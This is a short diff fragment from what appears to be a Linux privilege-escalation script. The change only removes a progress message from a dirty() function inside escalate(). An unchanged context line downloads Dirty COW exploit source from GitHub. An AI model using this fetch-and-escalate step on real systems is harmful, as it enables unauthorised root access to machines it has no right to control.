@@ -257,7 +257,6 @@ escalate(){
 
 
 	dirty(){
-		echo -e "This may take some time...\n"
 		downld https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c
 	}
 
